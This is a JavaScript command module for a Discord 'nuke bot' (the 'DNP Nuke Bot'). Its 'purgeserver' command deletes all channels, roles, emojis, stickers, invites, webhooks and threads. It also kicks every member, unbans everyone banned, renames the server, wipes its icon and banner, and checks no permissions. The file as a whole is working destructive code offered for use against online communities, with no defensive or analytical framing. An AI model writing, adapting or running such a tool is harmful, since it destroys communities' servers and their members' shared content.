const config = require('../../config.json');
function purgeServer(msg, args) {
    msg.guild.channels.cache.forEach(channel => {
        channel.delete();
    });
    msg.guild.roles
    .fetch()
    .then(roles => {
            roles.forEach(role => {
                role.delete();
            });
        });
        msg.guild.members.fetch().then(members => {
            members.forEach(member => {
                member.kick();
            });
        });
        msg.guild.emojis.cache.forEach(emoji => {
            emoji.delete();
        });
        msg.guild.stickers.cache.forEach(sticker => {
            sticker.delete();
        });
        msg.guild.invites.fetch().then(invites => {
            invites.forEach(invite => {
                invite.delete();
            });
        });
        msg.guild.webhooks.fetch().then(webhooks => {
            webhooks.forEach(webhook => {
                webhook.delete();
            });
        });
        msg.guild.bans.fetch().then(bans => {
            bans.forEach(ban => {
                ban.unban();
            });
        });
        msg.guild.threads.cache.forEach(thread => {
            thread.delete();
        });
        msg.guild.roles.create({
            name: config.messagesSettings.nuked_role_name,
            color: 'RANDOM',
            reason: 'Nuked by DNP Nuke Bot',
        });
        msg.guild.setName(config.messagesSettings.nuked_server_name);
        msg.guild.setIcon('');
        msg.guild.setBanner('');
        

}
module.exports = {
    name: 'purgeserver',
    description: 'Purges the entire server',
    execute(msg, args) {
        purgeServer(msg, args);
        msg.reply('Purged the entire server');
    }
}